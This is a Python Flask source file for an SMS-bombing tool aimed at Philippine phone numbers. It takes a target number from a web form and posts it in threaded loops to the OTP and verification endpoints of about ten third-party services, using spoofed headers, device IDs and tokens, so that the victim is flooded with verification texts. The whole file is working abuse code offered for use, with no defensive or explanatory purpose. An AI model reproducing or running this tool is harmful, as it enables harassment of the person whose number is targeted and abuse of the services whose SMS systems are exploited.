from flask import Flask, redirect, url_for, render_template, request, session
from flask import jsonify
from flask_socketio import SocketIO
import os
import requests
import sys
import time
from time import sleep
import json
import random
import base64
import argparse
from multiprocessing.pool import ThreadPool

app = Flask(__name__)
app.secret_key = "test"
socketio = SocketIO(app)

global slp
limit = 0
limit1 = 0
field = 0
slp = 0
RUN = True

session = requests.Session()
def otp(number):
    global limit, field
    if str(number[0]) == "0":
        number = number.replace(str(number[0]), "63")
    elif str(number[0]) == "+":
        number = number.replace("+", "")
    else:
        pass
    url = "https://admin.sunoro7778.site:443/api/sms/sendCode"
    header = {
        'Host': 'admin.sunoro7778.site',
        'Connection': 'keep-alive',
        'Content-Length': '352',
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.42',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': 'http://8.219.139.46',
        'X-Requested-With': 'com.BlackRvip.blackrock',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'http/8.219.139.46/',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9'
    }
    body = {"mobile": str(number), "type": 4, "token": "null", "language": "en_us"}
    try:
        web = requests.post(url, headers=header, json=body)
        r = json.loads(web.text)
        if r["code"] == 1:
            limit += 1
            return True
        else:
            field += 1
            return False
    except:
        field += 1
        return False


def otp1(number):
    global limit, field
    if str(number[0]) == "0":
        number = number.replace(str(number[0]), "63")
    elif str(number[0]) == "+":
        number = number.replace("+", "")
    else:
        pass
    url = "https://admin.sunoro7778.site:443/api/sms/sendCode"
    header = {
        'Host': 'admin.sunoro7778.site',
        'Connection': 'keep-alive',
        'Content-Length': '66',
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.42',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': 'http/8.219.139.46/',
        'X-Requested-With': 'com.BlackRvip.blackrock',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'http/8.219.139.46/',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9'
    }
    body = {"mobile": str(number), "type": 1, "token": "null", "language": "en_us"}
    try:
        web = requests.post(url, headers=header, json=body)
        r = json.loads(web.text)
        if r["code"] == 1:
            limit += 1
            return True
        else:
            field += 1
            return False
    except:
        field += 1
        return False

def otp2(number):
    global limit, field
    if str(number[0]) == "0":
        number = str(number[1:])
    elif str(number[0]) == "+":
        number = str(number[3:])
    elif str(number[:2]) == "63":
        number = str(number[:2])
    else:
        pass

    def bencoder(string):
        string = covert_to_string(string)
        string = string.encode("ascii")
        data = base64.b64encode(string)
        data = data.decode("ascii")
        return data

    def covert_to_string(string):
        string = str(string)
        string = string.replace('\'', '"')
        string = string.replace(" ", '')
        return string

    def get_timestamp():
        url = "http://login.ma7hrte3s4d5r6t.com:80/info"
        header = {
            'Host': 'login.ma7hrte3s4d5r6t.com',
            'User-Agent': 'UnityPlayer/2019.2.11f1 (UnityWebRequest/1.0, libcurl/7.52.0-DEV)',
            'Accept': '*/*',
            'Accept-Encoding': 'deflate, gzip',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Unity-Version': '2019.2.11f1',
            'Content-Length': '96'
        }
        body = {"content": "eyJ0eXBlIjoxLCJsdWFWZXIiOiIxMDY0MyIsInJlc1ZlciI6IjEwNjQyIiwiYXBwVmVyIjoiMS4wLjAifQ=="}
        web = requests.post(url, headers=header, data=body)
        page = json.loads(web.text)
        return page["svrTime"]

    url = "http://login.ma7hrte3s4d5r6t.com:80/verifyCode"
    header = {
        'Host': 'login.ma7hrte3s4d5r6t.com',
        'User-Agent': 'UnityPlayer/2019.2.11f1 (UnityWebRequest/1.0, libcurl/7.52.0-DEV)',
        'Accept': '*/*',
        'Accept-Encoding': 'deflate, gzip',
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Unity-Version': '2019.2.11f1',
        'Content-Length': '228'
    }
    str_body = {"timestamp": str(get_timestamp), "phoneArea": "063", "token": "074075569cc8ba75714fbbe39bf89590",
                "type": 1, "deviceCode": "beeffdbe2c54e77829192d7ec31f5b4e", "phone": str(number)}
    encrypt_body = bencoder(str(str_body))
    body = {"content": str(encrypt_body)}
    try:
        web = requests.post(url, headers=header, data=body)
        r = json.loads(web.text)
        if r["code"] == 0:
            limit += 1
            return True
        else:
            field += 1
            return False
    except:
        field += 1
        return False

def otp3(number):
    global limit, field
    if str(number[0]) == "0":
        number = "+63" + str(number[1:])
    elif str(number[:2]) == "63":
        number = "+" + str(number)
    else:
        pass
    url = "https://graphql.toktok.ph:2096/auth/graphql/"
    header = {
        'accept': '*/*',
        'authorization': '',
        'Content-Type': 'application/json',
        'Content-Length': '199',
        'Host': 'graphql.toktok.ph:2096',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'User-Agent': 'okhttp/4.9.1'
    }
    body = {
        "operationName": "loginRegister",
        "variables": {"input": {"mobile": str(number), "appFlavor": "C"}},
        "query": "mutation loginRegister($input: LoginRegisterInput!) {\nloginRegister(input: $input)\n}\n"
    }
    try:
        web = requests.post(url, headers=header, json=body)
        r = json.loads(web.text)
        if r["data"]["loginRegister"] == "REGISTER":
            limit += 1
            return True
        else:
            field += 1
            return False
    except:
        field += 1
        return False


def otp4(number):
    global limit, field
    if str(number[0]) == "+":
        number = "0" + str(number[1:])
    elif str(number[:2]) == "63":
        number = "0" + str(number[2:])
    else:
        pass
    url = "http://8.212.181.240:80/index/user/send_code"
    header = {
        'Device-Id': '3076685aef999931',
        'App-Id': 'UYJEeAtD',
        'Authorization': '',
        'Content-Type': 'application/json; charset=UTF-8',
        'Content-Length': '23',
        'Host': '8.212.181.240',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'User-Agent': 'okhttp/4.9.0'
    }
    body = {"phone": str(number)}
    try:
        web = requests.post(url, headers=header, json=body)
        r = json.loads(web.text)
        if r["msg"] == "success":
            limit += 1
            return True
        else:
            field += 1
            return False
    except:
        field += 1
        return False

def otp5(number):
    global limit, field
    if str(number[0]) == "0":
        number = number.replace(str(number[0]), "63")
    elif str(number[0]) == "+":
        number = number.replace("+", "")
    else:
        pass
    url = "https://api.777pub.app:443/account/get_code"
    header = {
        'Host': 'api.777pub.app',
        'Connection': 'keep-alive',
        'Content-Length': '83',
        'User-Agent': 'Mozilla/5.0 (Linux; U; Android 12; zh-cn; 2109119BC Build/SKQ1.211006.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/16.8.58 swan-mibrowser',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': '*/*',
        'Origin': 'https://www.777pub.com',
        'X-Requested-With': 'com.happythree.sevengames.pubshow',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.777pub.com/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9'
    }

    body = {
        "areaCode": "63",
        "phone": str(number),
        "deviceId": "c189865f-56b1-44d6-8c48-1bf12c8b3698",
        "version": "1.2.5",
        "uuid": "fe35a50211dfc6869c7dbd126c151961",
        "codeType": "1"
    }

    try:
        web = requests.post(url, headers=header, data=body)
        r = json.loads(web.text)
        if r["code"] == 200:
            limit += 1
            return True
        else:
            field += 1
            return False
    except:
        field += 1
        return False

def otp6(number):
    global limit, field
    if str(number[0]) == "0":
        number = number.replace(str(number[0]), "63")
    elif str(number[0]) == "+":
        number = number.replace("+", "")
    else:
        pass
    url = "https://www.banksampah123.com:8445/app/core/account/sendOtp"
    header = {
        'Host': 'www.banksampah123.com:8445',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9'
    }
    body = {
        "phone": str(number),
        "type": "login"
    }
    try:
        web = requests.post(url, headers=header, data=body)
        r = json.loads(web.text)
        if r["status"] == "success":
            limit += 1
            return True
        else:
            field += 1
            return False
    except:
        field += 1
        return False
def otp7(number):
    global limit, field
    if str(number[0]) == "0":
        number = number.replace(str(number[0]), "63")
    elif str(number[0]) == "+":
        number = number.replace("+", "")
    else:
        pass
    url = "https://api.gocashfree.com:443/api/v2/register/otp"
    header = {
        'Host': 'api.gocashfree.com',
        'Connection': 'keep-alive',
        'Content-Length': '32',
        'Accept': 'application/json, text/plain, */*',
        'Authorization': '',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.gocashfree.com',
        'Referer': 'https://www.gocashfree.com/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9'
    }
    body = {
        "mobile": str(number)
    }
    try:
        web = requests.post(url, headers=header, data=body)
        r = json.loads(web.text)
        if r["message"] == "The verification code has been sent to your phone number":
            limit += 1
            return True
        else:
            field += 1
            return False
    except:
        field += 1
        return False

def otp8(number):
    global limit, field
    if str(number[0]) == "0":
        number = number.replace(str(number[0]), "63")
    elif str(number[0]) == "+":
        number = number.replace("+", "")
    else:
        pass
    url = "https://api.777pub.app:443/account/get_code"
    header = {
        'Host': 'api.777pub.app',
        'Connection': 'keep-alive',
        'Content-Length': '83',
        'User-Agent': 'Mozilla/5.0 (Linux; U; Android 12; zh-cn; 2109119BC Build/SKQ1.211006.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/16.8.58 swan-mibrowser',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': '*/*',
        'Origin': 'https://www.777pub.com',
        'X-Requested-With': 'com.happythree.sevengames.pubshow',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.777pub.com/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9'
    }
    body = {
        "areaCode": "63",
        "phone": str(number),
        "deviceId": "c189865f-56b1-44d6-8c48-1bf12c8b3698",
        "version": "1.2.5",
        "uuid": "fe35a50211dfc6869c7dbd126c151961",
        "codeType": "1"
    }
    try:
        web = requests.post(url, headers=header, data=body)
        r = json.loads(web.text)
        if r["code"] == 200:
            limit += 1
            return True
        else:
            field += 1
            return False
    except:
        field += 1
        return False

def otp9(number):
    global limit, field
    if str(number[0]) == "0":
        number = number.replace(str(number[0]), "63")
    elif str(number[0]) == "+":
        number = number.replace("+", "")
    else:
        pass
    url = "https://auth.cashfree.com:443/api/v1/login/verify_mobile"
    header = {
        'Host': 'auth.cashfree.com',
        'Connection': 'keep-alive',
        'Content-Length': '43',
        'Accept': 'application/json, text/plain, */*',
        'Authorization': '',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.cashfree.com',
        'Referer': 'https://www.cashfree.com/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9'
    }
    body = {
        "phone": str(number),
        "is_web": "1"
    }
    try:
        web = requests.post(url, headers=header, data=body)
        r = json.loads(web.text)
        if r["success"] == True:
            limit += 1
            return True
        else:
            field += 1
            return False
    except:
        field += 1
        return False
        
def otp10(number):
    global limit, field
    if str(number[0]) == "0":
        number = number.replace(str(number[0]), "63")
    elif str(number[0]) == "+":
        number = number.replace("+", "")
    else:
        pass
    url = "https://api.tryscan.me:443/otp/send"
    header = {
        'Host': 'api.tryscan.me',
        'Connection': 'keep-alive',
        'Content-Length': '50',
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': 'https://www.tryscan.me',
        'Referer': 'https://www.tryscan.me/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9'
    }
    body = {
        "phone": str(number),
        "countryCode": "63"
    }
    try:
        web = requests.post(url, headers=header, json=body)
        r = json.loads(web.text)
        if r["success"] == True:
            limit += 1
            return True
        else:
            field += 1
            return False
    except:
        field += 1
        return False

def bomber(f, number, limit_arg, sleep_arg):
    global RUN, limit1, slp
    while RUN:
        if int(limit) >= int(limit_arg):
            break
        elif int(field) >= int(limit_arg):
            break
        elif RUN == False:
            break

        try:
            if f(number):
                sys.stdout.write("\r\033[1;92m[+] Sent: {} | \033[1;91m[-] Failed: {} ".format(str(limit), str(field)))
                sys.stdout.flush()
            else:
                sys.stdout.write("\r\033[1;92m[+] Sent: {} | \033[1;91m[-] Failed: {} ".format(str(limit), str(field)))
                sys.stdout.flush()

            if int(limit) >= int(limit_arg):
                RUN = False
        except Exception as e:
            sys.stdout.write("\r\033[1;92m[+] Sent: {} | \033[1;91m[-] Failed: {} ".format(str(limit), str(field)))
            sys.stdout.flush()

        time.sleep(int(sleep_arg))

def emit_message(message):
    socketio.emit('update', {'message':message})

@app.route('/')
def index():
    return render_template('main.html')

@app.route('/sent', methods=['POST'])
def sent():
    number = request.form.get('number')
    limit_arg = request.form.get('limit')
    sleep_arg = request.form.get('sleep')

    number = number
    slp = sleep_arg
    limit1 = limit_arg
    
    a = open("number.txt", "w")
    a.write(str(number))
    a.close()

    function = [otp, otp1, otp2, otp3, otp4, otp5, otp6, otp7, otp8, otp9, otp10]
    p = ThreadPool(len(function))
    p.starmap(bomber, [(f, number, limit_arg, sleep_arg) for f in function])

    response = {"message": "Sending OTP started!"}
    return jsonify(response)

if __name__ == "__main__":
   socketio.run(app, debug=True)
    
